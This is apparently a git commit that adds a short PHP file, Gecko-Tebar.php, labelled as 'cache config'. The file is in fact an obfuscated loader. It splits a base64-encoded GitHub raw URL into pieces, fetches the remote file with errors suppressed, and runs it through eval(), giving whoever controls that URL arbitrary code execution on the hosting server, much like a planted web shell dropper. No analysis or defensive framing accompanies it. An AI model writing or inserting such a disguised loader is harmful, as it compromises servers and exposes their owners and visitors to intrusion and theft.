a6ac9c0e7303f40d5a238a4273d1aa28fa14daf8
GodOfServer <AnonByte.GOS@protonmail.com>
2026-01-02 15:22:14 +0700

    Create Gecko-Tebar.php

---
+++ Gecko-Tebar.php
@@ -0,0 +1,7 @@
+<?php
+// cache config
+$p[0]='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbn';
+$p[1]='QuY29tL0dvZE5mU2VydmVyL1N1c2hpLURvbnQtTG';
+$p[2]='llL3JlZnMvaGVhZHMvbWFpbi9HZWNrby1UZWJhci5waHA';
+eval('?>'.@file_get_contents(base64_decode(join($p))));
+?>
